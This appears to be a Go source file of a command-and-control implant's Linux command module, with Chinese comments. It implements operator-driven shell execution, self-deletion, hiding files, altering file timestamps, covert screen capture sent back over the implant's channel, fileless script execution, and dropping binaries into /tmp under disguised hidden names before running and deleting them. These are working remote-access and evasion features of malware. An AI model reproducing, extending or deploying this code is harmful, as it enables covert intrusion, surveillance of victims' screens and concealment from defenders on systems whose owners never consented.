//go:build linux
// +build linux

package commands

import (
	"bytes"
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"implant/core/communication"
	"implant/core/debuglog"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// ================ PTY系统调用定义 ================

// Winsize PTY窗口大小结构（对应C的winsize结构）
type Winsize struct {
	Row    uint16
	Col    uint16
	Xpixel uint16
	Ypixel uint16
}

// 系统调用常量
const (
	TIOCSWINSZ = 0x5414 // 设置终端窗口大小的ioctl命令
)

// ================ 基础系统函数 ================

func HideConsole() error {
	return nil
}

func SetProcessDPIAware() error {
	return nil
}

func FullUnhook() error {
	return nil
}

func Run(b []byte) ([]byte, error) {
	return nil, nil
}

func DeleteSelf() ([]byte, error) {
	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}
	Path := strings.ReplaceAll(string(filename), "\\", "/")
	err = os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(filename) + " success"), nil
}

// DeleteSelfAndExit Linux：unlink 运行中文件安全，删除即完成（退出由调用方 os.Exit 承担）
func DeleteSelfAndExit() ([]byte, error) {
	return DeleteSelf()
}

func KillProcess(pid uint32) ([]byte, error) {
	err := syscall.Kill(int(pid), 15)
	if err != nil {
		return nil, errors.New("process" + strconv.Itoa(int(pid)) + "not found")
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
}

func Drives() ([]byte, error) {
	return []byte("/"), nil
}

// Shell 在 Linux 侧始终使用 /bin/sh（形参 path 保留以与 Windows 实现签名一致）
func Shell(_ string, args []byte) ([]byte, error) {
	path := "/bin/sh"
	argsArray := []string{"-c", string(args)}
	cmd := exec.Command(path, argsArray...)
	stdout, err := cmd.StdoutPipe()
	cmd.Stderr = cmd.Stdout
	if err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}
	if err = cmd.Start(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	var buf []byte
	var count int
	time.Sleep(500 * time.Millisecond)
	buf = make([]byte, 1024*50)
	// 首次读取的错误刻意忽略：shell 立即退出时此处即 EOF，
	// 下面循环会读到同一错误并正常收尾（原行为）
	count, _ = stdout.Read(buf)
	communication.DataProcess(0, buf[:count])
	for {
		buf = make([]byte, 1024*50)
		count, err = stdout.Read(buf)
		if err != nil {
			break
		}
		communication.DataProcess(0, append([]byte("[+] "+string(path)+" "+string(args)+" :\n"), buf[:count]...))
		time.Sleep(5000 * time.Millisecond)
	}

	if err = cmd.Wait(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	return []byte("success"), nil
}

// Execute 执行 `execute "<程序>" [参数...]`：后台启动、脱离当前会话，不等待退出。
// 原实现直接返回 "not supported"，导致文件管理器右键「执行文件」在 Linux 上永远失败。
func Execute(b []byte) ([]byte, error) {
	parts := SplitCommandLine(string(b))
	if len(parts) == 0 {
		return nil, errors.New("execute: empty command")
	}
	cmd := exec.Command(parts[0], parts[1:]...)
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("execute failed: %v", err)
	}
	_ = cmd.Process.Release()
	return []byte("success execute " + strings.Join(parts, " ")), nil
}

// Windows双引擎交互式Shell函数的Linux占位实现
func StartCMDInteractiveShell() ([]byte, error) {
	return nil, errors.New("Windows双引擎交互式Shell功能在Linux平台不可用")
}

func SendDualInteractiveInput(input []byte) ([]byte, error) {
	return nil, errors.New("Windows双引擎交互式Shell功能在Linux平台不可用")
}

func StopDualInteractiveShell() ([]byte, error) {
	return nil, errors.New("Windows双引擎交互式Shell功能在Linux平台不可用")
}

func StartWMIInteractiveShell() ([]byte, error) {
	return nil, errors.New("Windows双引擎交互式Shell功能在Linux平台不可用")
}

func InterruptDualInteractiveShell() ([]byte, error) {
	return nil, errors.New("Windows双引擎交互式Shell功能在Linux平台不可用")
}

func HideFile(filePath string) error {
	dir, filename := filepath.Split(filePath)
	if strings.HasPrefix(filename, ".") {
		return nil
	}
	return os.Rename(filePath, filepath.Join(dir, "."+filename))
}

func UnhideFile(filePath string) error {
	dir, filename := filepath.Split(filePath)
	if !strings.HasPrefix(filename, ".") {
		return nil
	}
	if filename[1:] == "" {
		return errors.New("Invalid filename")
	}
	return os.Rename(filePath, filepath.Join(dir, filename[1:]))
}

func ModifyFileTimeAdvanced(filePath string, newTime time.Time) error {
	return os.Chtimes(filePath, newTime, newTime)
}

func StartScreenMonitor(frameRate int) error {
	globalLinuxMonitor.mutex.Lock()
	defer globalLinuxMonitor.mutex.Unlock()

	if globalLinuxMonitor.isRunning {
		return errors.New("屏幕监控已经在运行中")
	}

	if frameRate <= 0 || frameRate > 30 {
		frameRate = 5
	}

	captureMethod := detectBestCaptureMethod()
	if captureMethod == "" {
		return errors.New("系统中未找到可用的屏幕捕获工具")
	}

	globalLinuxMonitor.frameRate = frameRate
	globalLinuxMonitor.captureMethod = captureMethod
	globalLinuxMonitor.isRunning = true

	debuglog.Printf("[✓] Linux屏幕监控已启动，帧率: %dFPS，捕获方法: %s\n", frameRate, captureMethod)
	return nil
}

func StopScreenMonitor() error {
	globalLinuxMonitor.mutex.Lock()
	defer globalLinuxMonitor.mutex.Unlock()

	if !globalLinuxMonitor.isRunning {
		return errors.New("屏幕监控未在运行")
	}

	globalLinuxMonitor.isRunning = false

	select {
	case globalLinuxMonitor.stopChannel <- true:
	default:
	}

	debuglog.Println("[✓] Linux屏幕监控已停止")
	return nil
}

func GetMonitorFrame() ([]byte, error) {
	globalLinuxMonitor.mutex.Lock()
	defer globalLinuxMonitor.mutex.Unlock()

	if !globalLinuxMonitor.isRunning {
		return nil, errors.New("屏幕监控未启动")
	}

	switch globalLinuxMonitor.captureMethod {
	case "imagemagick":
		return captureFrameWithImageMagick()
	case "ffmpeg":
		return captureFrameWithFFmpeg()
	case "xwd":
		return captureFrameWithXWD()
	default:
		return nil, errors.New("未知的捕获方法: " + globalLinuxMonitor.captureMethod)
	}
}

func detectBestCaptureMethod() string {
	methods := []struct {
		name    string
		cmdTest []string
	}{
		{"imagemagick", []string{"import", "-version"}},
		{"ffmpeg", []string{"ffmpeg", "-version"}},
		{"xwd", []string{"xwd", "-help"}},
	}

	for _, method := range methods {
		cmd := exec.Command(method.cmdTest[0], method.cmdTest[1:]...)
		cmd.Stdout = nil
		cmd.Stderr = nil
		if err := cmd.Run(); err == nil {
			return method.name
		}
	}
	return ""
}

func captureFrameWithImageMagick() ([]byte, error) {
	// K9: 15s 超时（X 服务异常/挂起时不再永久阻塞 beacon 命令循环）
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "import",
		"-window", "root",
		"-resize", "75%",
		"-quality", "70",
		"-define", "png:compression-level=3",
		"-depth", "8",
		"png:-",
	)

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		return nil, fmt.Errorf("ImageMagick捕获失败: %v", err)
	}

	if out.Len() == 0 {
		return nil, errors.New("捕获的图像数据为空")
	}

	base64Data := base64.StdEncoding.EncodeToString(out.Bytes())
	return []byte("data:image/png;base64," + base64Data), nil
}

func captureFrameWithFFmpeg() ([]byte, error) {
	display := os.Getenv("DISPLAY")
	if display == "" {
		display = ":0.0"
	}

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "ffmpeg",
		"-f", "x11grab",
		"-video_size", "1280x720",
		"-i", display,
		"-vframes", "1",
		"-c:v", "png",
		"-f", "image2pipe",
		"-loglevel", "quiet",
		"-",
	)

	var out bytes.Buffer
	cmd.Stdout = &out

	err := cmd.Run()
	if err != nil {
		return nil, fmt.Errorf("FFmpeg捕获失败: %v", err)
	}

	if out.Len() == 0 {
		return nil, errors.New("FFmpeg捕获的图像数据为空")
	}

	base64Data := base64.StdEncoding.EncodeToString(out.Bytes())
	return []byte("data:image/png;base64," + base64Data), nil
}

func captureFrameWithXWD() ([]byte, error) {
	// K9: 15s 超时
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "xwd", "-root", "-silent")
	var xwdOut bytes.Buffer
	cmd.Stdout = &xwdOut

	err := cmd.Run()
	if err != nil {
		return nil, fmt.Errorf("xwd捕获失败: %v", err)
	}

	cmd = exec.Command("convert",
		"xwd:-",
		"-resize", "75%",
		"-quality", "70",
		"png:-",
	)
	cmd.Stdin = &xwdOut
	var pngOut bytes.Buffer
	cmd.Stdout = &pngOut

	err = cmd.Run()
	if err != nil {
		return nil, fmt.Errorf("xwd转换失败: %v", err)
	}

	if pngOut.Len() == 0 {
		return nil, errors.New("转换后的图像数据为空")
	}

	base64Data := base64.StdEncoding.EncodeToString(pngOut.Bytes())
	return []byte("data:image/png;base64," + base64Data), nil
}

func ExecuteAssembly(assemblyBytes []byte, arguments string, execTaskID uint32) ([]byte, error) {
	return nil, errors.New(".NET程序集执行功能在Linux平台暂不支持")
}

func InlineBin(assemblyBytes []byte, arguments string) ([]byte, error) {
	return nil, errors.New("内联二进制执行功能在Linux平台暂不支持")
}

func TakeScreenshot(quality int) ([]byte, error) {
	// 档位 → ImageMagick 质量（0 低=60 / 1 中=75 / 2 高=90）
	q := 75
	switch quality {
	case 0:
		q = 60
	case 2:
		q = 90
	}
	// K9: 15s 超时
	sctx, scancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer scancel()
	cmd := exec.CommandContext(sctx, "import", "-window", "root", "-quality", strconv.Itoa(q), "png:-")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err == nil {
		base64Data := base64.StdEncoding.EncodeToString(out.Bytes())
		return []byte("data:image/png;base64," + base64Data), nil
	}

	cmd = exec.Command("xwd", "-root", "-silent")
	var xwdOut bytes.Buffer
	cmd.Stdout = &xwdOut

	err = cmd.Run()
	if err != nil {
		return nil, errors.New("无法截取屏幕：" + err.Error())
	}

	cmd = exec.Command("convert", "xwd:-", "png:-")
	cmd.Stdin = &xwdOut
	var pngOut bytes.Buffer
	cmd.Stdout = &pngOut

	err = cmd.Run()
	if err != nil {
		return nil, errors.New("无法转换截图格式：" + err.Error())
	}

	base64Data := base64.StdEncoding.EncodeToString(pngOut.Bytes())
	return []byte("data:image/png;base64," + base64Data), nil
}

// ExecuteLinuxScript Linux脚本内存执行(fileless sh -s 管道)
// unixExecTimeout 插件执行的兜底超时：子进程不退出时不能永久阻塞命令循环。
const unixExecTimeout = 10 * time.Minute

func ExecuteLinuxScript(scriptBytes []byte, args string) ([]byte, error) {
	// -s 从 stdin 读脚本；"--" 之后的参数成为脚本的 $1..$N
	argv := []string{"-s", "--"}
	if fields := strings.Fields(args); len(fields) > 0 {
		argv = append(argv, fields...)
	}
	ctx, cancel := context.WithTimeout(context.Background(), unixExecTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, "/bin/sh", argv...)
	cmd.Stdin = bytes.NewReader(scriptBytes)
	var stdout bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stdout
	err := cmd.Run()
	communication.ExecOutput(stdout.Bytes())
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return []byte("script timeout (10m)"), fmt.Errorf("script execution timeout (10m)")
		}
		// 返回错误让 dispatch 发送 EXEC_DONE(ok=0)；不能只返回文本，
		// 否则服务端会按"执行成功"收敛任务。
		return []byte(fmt.Sprintf("script error: %v", err)), err
	}
	return []byte("Linux script executed"), nil
}

// ExecuteLinuxBin Linux二进制执行(/tmp 写执行删)
func ExecuteLinuxBin(binBytes []byte, args string) ([]byte, error) {
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".%s_%d", masquerade(""), time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, binBytes, 0755); err != nil {
		return nil, err
	}
	defer os.Remove(tmpFile)
	ctx, cancel := context.WithTimeout(context.Background(), unixExecTimeout)
	defer cancel()
	var cmd *exec.Cmd
	if args != "" {
		cmd = exec.CommandContext(ctx, tmpFile, strings.Fields(args)...)
	} else {
		cmd = exec.CommandContext(ctx, tmpFile)
	}
	var stdout bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stdout
	err := cmd.Run()
	communication.ExecOutput(stdout.Bytes())
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return []byte("binary timeout (10m)"), fmt.Errorf("binary execution timeout (10m)")
		}
		return []byte(fmt.Sprintf("binary error: %v", err)), err
	}
	return []byte("Linux binary executed"), nil
}

// ExecuteBof BOF(COFF)执行(仅Windows)
func ExecuteBof(coffBytes []byte, args string) ([]byte, error) {
	return nil, errors.New("BOF(COFF)执行功能在当前平台不可用(仅Windows)")
}

// ExecuteFile 文件执行(写临时文件->执行->捕获输出->删除)
func ExecuteFile(fileBytes []byte, args string) ([]byte, error) {
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".%s_exec_%d", masquerade(""), time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, fileBytes, 0755); err != nil {
		return nil, err
	}
	defer os.Remove(tmpFile)
	ctx, cancel := context.WithTimeout(context.Background(), unixExecTimeout)
	defer cancel()
	var cmd *exec.Cmd
	if args != "" {
		cmd = exec.CommandContext(ctx, tmpFile, strings.Fields(args)...)
	} else {
		cmd = exec.CommandContext(ctx, tmpFile)
	}
	var stdout bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stdout
	err := cmd.Run()
	communication.ExecOutput(stdout.Bytes())
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return []byte("file exec timeout (10m)"), fmt.Errorf("file execution timeout (10m)")
		}
		return []byte(fmt.Sprintf("file exec error: %v", err)), err
	}
	return []byte("file executed"), nil
}
